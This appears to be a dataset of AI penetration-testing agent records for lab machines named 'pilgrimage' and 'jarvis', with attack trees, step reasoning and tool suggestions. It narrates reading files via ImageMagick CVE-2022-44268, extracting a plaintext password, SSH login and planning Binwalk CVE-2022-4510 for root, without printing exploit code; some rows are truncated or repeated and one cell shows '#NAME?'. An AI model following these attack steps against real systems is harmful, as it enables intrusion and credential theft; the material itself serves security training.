   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Exploit the selected exploitations - [completed] {The exploit was re-run, this time targeting the /var/db/pilgrimage file. The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script. The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command. The database can now be opened using the sqlite3 command for further exploration.}
   1.11 Enumerate the Database Tables - [completed] {The SQLite database contains two tables: 'images' and 'users'. A SQL query was executed to select all data from the 'users' table. The query returned a username 'emily' and a password 'abigchonkyboi123'.}
   1.12 Login Using the Revealed Credentials - [completed] {A successful SSH login was made into the system as the 'emily' user. The host 'pilgrimage.htb' was previously unknown
   1.13 Enumerate Files and Commands - [completed] {The 'ps auxww | grep root' command reveals a Bash script called 'malwarescan.sh' being executed by the root user. The script likely calls the 'inotifywait' command. The 'malwarescan.sh' script monitors the directory /var/www/pilgrimage.htb/shrunk/ for file creations. When a new file is created, the script runs 'binwalk'}
   1.14 Check the 'binwalk' software version - [completed] {The version of Binwalk being used in the system is v2.3.2}
   1.15 Do a vulnerability analysis on the Binwalk v2.3.2 - [completed] {The version of Binwalk being used, v2.3.2, is known to have several security vulnerabilities. The most severe vulnerability, CVE-2022-4510, is a path traversal flaw leading to Remote Code Execution (RCE). This is located in the Professional File System (PFS) extractor plugin. By crafting a malicious PFS filesystem file, an attacker can force Binwalk to extract files to arbitrary locations outside the intended extraction directory. Binwalk versions from 2.1.2b through 2.3.3 are vulnerable to this. The recommended mitigation is to upgrade Binwalk to version 2.3.4 or later. Another vulnerability, CVE-2021-4287, exists in Binwalk versions up to 2.3.2. It involves a symlink",Do a vulnearbility analysis on the Binwalk v2.3.2,"1. The previous steps were successful in identifying that a Bash script called 'malwarescan.sh' is being executed by the root user and uses 'binwalk' to process newly created files. We also found out that the version of 'binwalk' being used is v2.3.2.

2. Given this information, it is logical to further explore potential vulnerabilities in 'binwalk' v2.3.2. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. In the context of the selected strategy, doing a Google search for more information involves searching for known vulnerabilities in 'binwalk' v2.3.2 and potential ways to exploit them. This could potentially reveal additional vulnerabilities or misconfigurations that could be exploited to escalate privileges.

4. Once the Google search is completed, the findings should be analyzed and used to plan the next steps. This could potentially include exploiting identified vulnerabilities, or it could lead to the identification of new strategies or avenues for further exploration.

5. Therefore, the selected step of doing a Google search for more information is a logical next step given the information gained in the previous steps and the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.","- The version of Binwalk being used, v2.3.2, is known to have several security vulnerabilities.
- The most severe vulnerability, CVE-2022-4510, is a path traversal flaw leading to Remote Code Execution (RCE). This is located in the Professional File System (PFS) extractor plugin. By crafting a malicious PFS filesystem file, an attacker can force Binwalk to extract files to arbitrary locations outside the intended extraction directory. Binwalk versions from 2.1.2b through 2.3.3 are vulnerable to this. The recommended mitigation is to upgrade Binwalk to version 2.3.4 or later.
- Another vulnerability, CVE-2021-4287, exists in Binwalk versions up to 2.3.2. It involves a symlink following issue within the ""Archive Extraction Handler"" component, potentially resulting in unauthorized access or disclosure of sensitive information. Upgrading to version 2.3.3 (or later) addresses this issue.
- In conclusion, it is highly recommended to upgrade Binwalk to the latest stable version (2.3.4 or newer) to patch these critical security flaws.",Exploit the seleted vulnerabilities,"1. The intended task of the previous step was to conduct a vulnerability analysis on Binwalk v2.3.2. This task was successfully achieved, and it was found that Binwalk v2.3.2 has several known vulnerabilities, including a severe path traversal flaw leading to Remote Code Execution (RCE) and a symlink following issue potentially resulting in unauthorized access or disclosure of sensitive information.

2. The successful identification of these vulnerabilities is a key finding as it provides potential avenues for privilege escalation. If these vulnerabilities can be exploited, they could provide further access to the system, aligning with the overall goal of the penetration testing",Exploit the selected exploitations,"1. The previous steps were successful in identifying that Binwalk v2.3.2 is being used in the system and that this version has several known vulnerabilities. These vulnerabilities include a severe path traversal flaw leading to Remote Code Execution (RCE) and a symlink following issue potentially resulting in unauthorized access or disclosure of sensitive information.

2. Given this information, it is logical to further explore these vulnerabilities by attempting to exploit them. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. In the context of the selected strategy, exploiting the selected vulnerabilities involves using known exploits or crafting custom exploits to take advantage of the identified vulnerabilities. This could potentially allow for privilege escalation or unauthorized access to sensitive information.

4. Once the exploitation attempts are completed, the results should be analyzed to determine the success of the exploits and to plan the next steps. This could potentially include further exploitation attempts, or it could lead to the identification of new strategies or avenues for further exploration.

5. Therefore, the selected step of exploiting the selected vulnerabilities is a logical next step given the information gained in the previous steps and the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.",{'Metasploit': 'Use known exploits or craft custom exploits for Binwalk v2.3.2 vulnerabilities.'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Exploit the selected exploitations - [completed] {The exploit was re-run, this time targeting the /var/db/pilgrimage file. The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script. The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command. The database can now be opened using the sqlite3 command for further exploration.}
   1.11 Enumerate the Database Tables - [completed] {The SQLite database contains two tables: 'images' and 'users'. A SQL query was executed to select all data from the 'users' table. The query returned a username 'emily' and a password 'abigchonkyboi123'.}
   1.12 Login Using the Revealed",Exploit the seleted vulnerabilities,"1. The previous steps were successful in identifying that Binwalk v2.3.2 is being used in the system and that this version has several known vulnerabilities. These vulnerabilities include a severe path traversal flaw leading to Remote Code Execution (RCE) and a symlink following issue potentially resulting in unauthorized access or disclosure of sensitive information.

2. Given this information, it is logical to further explore these vulnerabilities by attempting to exploit them. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. In the context of the selected strategy, exploiting the selected vulnerabilities involves using known exploits or crafting custom exploits to take advantage of the identified vulnerabilities. This could potentially allow for privilege escalation or unauthorized access to sensitive information.

4. Once the exploitation attempts are completed, the results should be analyzed to determine the success of the exploits and to plan the next steps. This could potentially include further exploitation attempts, or it could lead to the identification of new strategies or avenues for further exploration.

5. Therefore, the selected step of exploiting the selected vulnerabilities is a logical next step given the information gained in the previous steps and the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.",#NAME?,End the task,"1. The intended task of the previous step was to exploit the selected vulnerabilities to escalate privileges. This task was successfully achieved, and root access was obtained on the system. 

2. The successful escalation of privileges to root is a key finding as it signifies that full control over the system has been obtained. This is the ultimate goal of the penetration testing task, and there is no further need to identify and exploit additional vulnerabilities.

3. Given the success of the previous step and the achievement of the ultimate goal, it is logical to end the task at this point. There is no need to move forward with the same strategy or to move to a new strategy, as the task has been successfully completed.",End task and ask permission to generate the report,"1. The previous steps were successful in identifying vulnerabilities, exploiting them, and ultimately gaining root access to the system. This is the ultimate goal of the penetration testing task, indicating successful completion of the task.

2. Given this information, it is logical to end the task at this point. Continuing to identify and exploit additional vulnerabilities is unnecessary as full control over the system has already been obtained.

3. In the context of the selected strategy, ending the task involves wrapping up all activities related to the penetration testing task. This includes cleaning up any changes made to the system during the testing process, ensuring that the system is left in a secure state, and preparing to report the findings.

4. Once the task has been ended, it is important to communicate with the user or client to inform them of the completion of the task and to ask for permission to generate a report on the findings. This report would detail the vulnerabilities identified, the exploits used, and the level of access obtained, providing valuable information for improving the system's security.

5. Therefore, the selected step of ending the task and asking for permission to generate the report is a logical next step given the successful completion of the penetration testing task and the need to communicate the findings to the user or client.",{'Nmap': 'Scan ports and services'}
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)",,,"**Nmap Scan Report for 10.10.10.143:**

- **Host Status:** Up (0.15s latency)
  
- **Scanned Ports, States, and Services:**
  1. **Port 22/tcp**
     - **State:** Open
     - **Service:** SSH
     - **Version:** OpenSSH 7.4p1 Debian 10+deb9u6
     - **Protocol:** 2.0
     - **SSH Hostkey:** [Information snipped]

  2. **Port 80/tcp**
     - **State:** Open
     - **Service:** HTTP
     - **Version:** Apache httpd 2.4.25 (Debian)
     - **HTTP Cookie Flags:**
       - **Path:** /
       - **PHPSESSID:** httponly flag not set
     - **Server Header:** Apache/2.4.25 (Debian)
     - **Page Title:** Stark Hotel

  3. **Port 64999/tcp**
     - **State:** Open
     - **Service:** HTTP
     - **Version:** Apache httpd 2.4.25 (Debian)
     - **Server Header:** Apache/2.4.25 (Debian)
     - **Page Title:** Site doesn't have a title (text/html).","Enumerate the port 80, HTTP service","1. **Check of Previous Step Achievement**: The intended task of the previous step, which was to identify open ports and the services running on them along with their versions, has been successfully completed. The penetration testing tree confirms that both subtasks under section 1.3 have been marked as completed. The results from the Nmap scan clearly detail the status, services, and versions for each open port, including port 80.

2. **Key Findings and Their Implications**: The findings from the port scan indicate that port 80 is open and running an HTTP service powered by Apache httpd 2.4.25 on Debian. This port also presents several interesting aspects such as server header information, the presence of a PHPSESSID cookie without the 'httponly' flag set, and a specific page title ""Stark Hotel"". These details suggest potential vectors for further investigation, such as:
   - The absence of the 'httponly' flag on the PHPSESSID cookie could make the session cookie susceptible to access via client-side scripts, potentially exposing it to cross-site scripting (XSS) attacks.
   - The specific server version and configuration details can be used to search for known vulnerabilities or misconfigurations in Apache httpd 2.4.25.
   - The page title ""Stark Hotel"" might indicate the application's context or functionality, which can guide further targeted attacks or social engineering attempts.

3. **Strategy Evaluation and Next Steps**: Given the detailed information available about the HTTP service on port 80 and the potential security implications highlighted by the scan results, it is logical to continue with the strategy of enumerating this service. This next step will allow for a deeper investigation into the web application's security posture, potentially uncovering vulnerabilities such as misconfigurations, outdated server software, improper session management, or exploitable scripts. Moving forward with the enumeration of port 80 is therefore a well-founded strategy based on the data gathered from the initial reconnaissance phase. Further enumeration could include tasks such as directory brute-forcing, application behavior analysis under different inputs, and checking for outdated plugins or configurations that could be exploited.","Enumerate further on the X service to find software versions, hidden directories and file.","1. **Evaluation of Current Strategy**: The current strategy focuses on enumerating the HTTP service on port 80, as identified from the initial scan results. This step logically follows the successful identification of open ports and services, particularly the HTTP service running on Apache httpd 2.4.25, as listed in the updated Penetration Testing Tree (PTT). The enumeration of HTTP services is crucial because it can reveal potential vulnerabilities, misconfigurations, or sensitive information that could be exploited.

2. **Key Findings Leading to Further Steps**: The findings from the earlier scan showed that the HTTP service on port 80 includes specific configurations such as the server version and the absence of certain security flags in cookies. These details are significant because:
   - The server version (Apache httpd 2.4.25) can be investigated for known vulnerabilities or exploits that could be used to gain unauthorized access or escalate privileges.
   - The lack of 'httponly' flags in PHPSESSID cookies suggests potential vulnerabilities to client-side attacks like XSS, which could be further explored through testing for script injection or session hijacking.

3. **Logical Progression to Selected Step**: The next logical step is to use tools and techniques such as a web browser for manual exploration, curl for testing specific web server behaviors, and gobuster for directory brute-forcing. This approach is aimed at:
   - **Using a web browser**: To manually explore the website’s features, navigation, and to observe its behavior in a user-like interaction. This can help identify any obvious misconfigurations or visible vulnerabilities (such as form inputs without proper validation).
   - **Using curl**: To interact with the web server from the command line to test for specific responses or behaviors when different types of data are submitted. Curl can be particularly useful for testing server responses to crafted requests that might exploit server-side vulnerabilities.
   - **Using gobuster**: To perform directory and file enumeration, which can uncover hidden directories, backup files, or other sensitive resources that are not intended to be publicly accessible but are poorly secured.

Each of these tools contributes to a thorough examination of the HTTP service, targeting different aspects of the web application's architecture and security posture. The goal is to compile a comprehensive understanding of potential vulnerabilities that could be exploited in subsequent phases of the penetration test. This step is essential for probing deeper into the application layer, where many security flaws often reside, especially in web-based services.","{'Web page interaction': 'Manually explore the website’s features and navigation.', 'Interactive CLI': 'Use curl to test specific web server behaviors.', 'Dirbuster': 'Perform directory and file enumeration to uncover hidden resources.'}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)","Enumerate the port 80, HTTP service","1. **Evaluation of Current Strategy**: The current strategy focuses on enumerating the HTTP service on port 80, as identified from the initial scan results. This step logically follows the successful identification of open ports and services, particularly the HTTP service running on Apache httpd 2.4.25, as listed in the updated Penetration Testing Tree (PTT). The enumeration of HTTP services is crucial because it can reveal potential vulnerabilities, misconfigurations, or sensitive information that could be exploited.

2. **Key Findings Leading to Further Steps**: The findings from the earlier scan showed that the HTTP service on port 80 includes specific configurations such as the server version and the absence of certain security flags in cookies. These details are significant because:
   - The server version (Apache httpd 2.4.25) can be investigated for known vulnerabilities or exploits that could be used to gain unauthorized access or escalate privileges.
   - The lack of 'httponly' flags in PHPSESSID cookies suggests potential vulnerabilities to client-side attacks like XSS, which could be further explored through testing for script injection or session hijacking.

3. **Logical Progression to Selected Step**: The next logical step is to use tools and techniques such as a web browser for manual exploration, curl for testing specific web server behaviors, and gobuster for directory brute-forcing. This approach is aimed at:
   - **Using a web browser**: To manually explore the website’s features, navigation, and to observe its behavior in a user-like interaction. This can help identify any obvious misconfigurations or visible vulnerabilities (such as form inputs without proper validation).
   - **Using curl**: To interact with the web server from the command line to test for specific responses or behaviors when different types of data are submitted. Curl can be particularly useful for testing server responses to crafted requests that might exploit server-side vulnerabilities.
   - **Using gobuster**: To perform directory and file enumeration, which can uncover hidden directories, backup files, or other sensitive resources that are not intended to be publicly accessible but are poorly secured.

Each of these tools contributes to a thorough examination of the HTTP service, targeting different aspects of the web application's architecture and security posture. The goal is to compile a comprehensive understanding of potential vulnerabilities that could be exploited in subsequent phases of the penetration test. This step is essential for probing deeper into the application layer, where many security flaws often reside, especially in web-based services.","**Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"":**

- **Webpage Title:** Stark Hotel
- **Notable Feature:** Login option available.
- **Virtual Host (vhost):** supersecurehotel.htb (requires addition to the hosts file for proper resolution).

**Gobuster Scanning Outcome:**
- **Action:** Running Gobuster to scan the server.
- **Result:** Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad.""
- **Implication:** The server has active measures to prevent automated scanning tools, complicating further scanning activities.",Enumerate the port 64999,"1. **Check of Previous Step Achievement**: The intended task of the previous steps, particularly the enumeration of the HTTP service on port 80, was achieved successfully. The penetration testing tree shows that information was gathered about the web server, including the presence of a login feature and the need to adjust the hosts file to resolve the virtual host. Additionally, an attempt to use Gobuster for directory brute-forcing led to a temporary ban, indicating that the server has active security measures against automated scanning tools.

2. **Key Findings and Their Implications**: The key findings from the enumeration of port 80's HTTP service include:
   - **Server Hardening**: The server's response to the Gobuster scan with a temporary ban suggests robust monitoring and response mechanisms to scanning attempts, indicating a higher level of security.
   - **Virtual Host Information**: The discovery of a specific virtual host (supersecurehotel.htb) suggests that there may be additional content served under this domain, potentially accessible by adjusting local DNS resolution (hosts file).
   - **Login Feature**: The presence of a login option indicates potentially exploitable authentication mechanisms or session management flaws.

   These findings suggest that while port 80 is hardened against certain types of attacks, it might still contain vulnerabilities, particularly related to its web applications. However, the active security measures complicate further direct scanning or brute-forcing attempts.

3. **Strategy Evaluation and Next Steps**: Given the robust security measures encountered on port 80 and the complications in further scanning without potentially triggering additional security responses, it is logical to shift focus to another entry point. Port 64999, also running an HTTP service, presents itself as a viable alternative target for further exploration. This port may have different security configurations or less stringent monitoring compared to port 80, providing a new avenue for discovering vulnerabilities. The strategy to move to enumerating port 64999 is based on:
   - **Diversification of Attack Surface**: Exploring different services to identify the least secure entry point.
   - **Potential for Lesser Security Measures**: Given that port 80 has shown strong security responses, port 64999 might be configured differently and could potentially offer more fruitful results without immediate banning.

This strategic shift is supported by the principle of attacking the weakest link in the security chain and adapting the attack strategy based on the system's response to initial testing efforts.","Enumerate further on the X service to find software versions, hidden directories and file.","1. **Evaluation of Current Strategy**: The current strategy involves shifting focus to port 64999 for enumeration, following the robust security measures encountered on port 80. This decision is based on the findings from the updated Penetration Testing Tree (PTT) where port 64999 is also running an HTTP service, but potentially under different configurations than those on port 80. This makes it a strategic target for further investigation.

2. **Key Findings Leading to Further Steps**: From the PTT, it is noted that port 64999 is running an HTTP service on Apache httpd 2.4.25, similar to port 80, but without additional details on security measures or configurations like those encountered on port 80 (e.g., active banning mechanisms). This suggests that:
   - **Similar Software, Different Configuration**: While the software version is the same as that on port 80, the absence of noted active security responses (like banning on Gobuster use) on port 64999 could indicate different security settings or oversight in equally securing all services.
   - **Potential for Less Hardened Security**: There might be a possibility that security measures are not as stringent on port 64999, providing an opportunity for deeper penetration without immediate countermeasures.

3. **Logical Progression to Selected Step**: The next logical step is to employ tools such as a web browser, curl, and Gobuster for a comprehensive enumeration of port 64999. This approach is aimed at:
   - **Using a web browser**: To manually explore any web interfaces available through port 64999. This can help in understanding the application's context, navigation, features, and any visible security misconfigurations.
   - **Using curl**: To interact with the web server to test for specific responses when manipulated requests are sent. This can help in identifying how the server handles unexpected input or malformed requests, which might reveal vulnerabilities or misconfigurations.
   - **Using Gobuster**: To perform directory and file enumeration. This is crucial as it might reveal hidden directories, configuration files, or backup files that are not intended for public access but might contain sensitive information or further exploitable vulnerabilities.

This selected step of enumerating port 64999 using diverse tools targets different aspects of the web service's architecture and security setup. The aim is to uncover any vulnerabilities, hidden files, or directories that were not apparent through the initial scan and which might provide deeper access or control over the server. This step is essential, especially after encountering strong security measures on port 80, as it might reveal the weaker security links in the server's configuration.","{'Web page interaction': 'Manually explore web interfaces on port 64999.', 'Interactive CLI': 'Use curl to send manipulated requests to the web server on port 64999.', 'Dirbuster': 'Perform directory and file enumeration on port 64999.'}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)",Enumerate the port 64999,"1. **Evaluation of Current Strategy**: The current strategy involves shifting focus to port 64999 for enumeration, following the robust security measures encountered on port 80. This decision is based on the findings from the updated Penetration Testing Tree (PTT) where port 64999 is also running an HTTP service, but potentially under different configurations than those on port 80. This makes it a strategic target for further investigation.

2. **Key Findings Leading to Further Steps**: From the PTT, it is noted that port 64999 is running an HTTP service on Apache httpd 2.4.25, similar to port 80, but without additional details on security measures or configurations like those encountered on port 80 (e.g., active banning mechanisms). This suggests that:
   - **Similar Software, Different Configuration**: While the software version is the same as that on port 80, the absence of noted active security responses (like banning on Gobuster use) on port 64999 could indicate different security settings or oversight in equally securing all services.
   - **Potential for Less Hardened Security**: There might be a possibility that security measures are not as stringent on port 64999, providing an opportunity for deeper penetration without immediate countermeasures.

3. **Logical Progression to Selected Step**: The next logical step is to employ tools such as a web browser, curl, and Gobuster for a comprehensive enumeration of port 64999. This approach is aimed at:
   - **Using a web browser**: To manually explore any web interfaces available through port 64999. This can help in understanding the application's context, navigation, features, and any visible security misconfigurations.
   - **Using curl**: To interact with the web server to test for specific responses when manipulated requests are sent. This can help in identifying how the server handles unexpected input or malformed requests, which might reveal vulnerabilities or misconfigurations.
   - **Using Gobuster**: To perform directory and file enumeration. This is crucial as it might reveal hidden directories, configuration files, or backup files that are not intended for public access but might contain sensitive information or further exploitable vulnerabilities.

This selected step of enumerating port 64999 using diverse tools targets different aspects of the web service's architecture and security setup. The aim is to uncover any vulnerabilities, hidden files, or directories that were not apparent through the initial scan and which might provide deeper access or control over the server. This step is essential, especially after encountering strong security measures on port 80, as it might reveal the weaker security links in the server's configuration.","**Webpage Security Note:**

- **Observation:** The webpage on the Apache server (port 80) titled ""Stark Hotel"" is noted to be hardened.
- **Outcome:** Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect.","Check all the links, pages sources in the web application on port 80","1. **Check of Previous Step Achievement**: The previous steps focused on enumerating the HTTP service on port 64999, using tools like a web browser, curl, and Gobuster. The intended task was to find vulnerabilities, software versions, hidden directories, and files. However, the specific results of these efforts on port 64999 aren't detailed in the provided PTT, implying that no significant vulnerabilities or further actionable information was discovered from this enumeration. This suggests either a high level of security on port 64999 or a lack of easily exploitable vulnerabilities.

2. **Key Findings and Their Implications**: Given that no significant vulnerabilities were reported on port 64999, it is logical to deduce that like port 80, port 64999 might also be well-secured. This leads to the conclusion that the security posture of the services running on these ports is robust, or that the methods used were not sufficient to uncover the vulnerabilities. The key findings from the earlier enumeration of port 80 indicated strong security measures, such as active monitoring and response to scanning attempts, as well as a hardened webpage setup.

3. **Strategy Evaluation and Next Steps**: With both port 80 and 64999 showing strong security measures, the strategy needs to be adjusted to explore other potential vulnerabilities within what has already been accessed. The next logical step is to delve deeper into the web application on port 80 by:
   - **Checking all links and page sources**: This involves a thorough manual inspection of the web application's content, including all navigable links and the source code of the pages. Such an examination can reveal hidden comments, endpoints, or parameters that automated tools might have missed.
   - **Searching for vulnerabilities in the web application logic**: Manual inspection might uncover issues like insecure direct object references, unhandled edge cases in the application logic, or exposure of sensitive information in the source code that automated scans cannot detect.
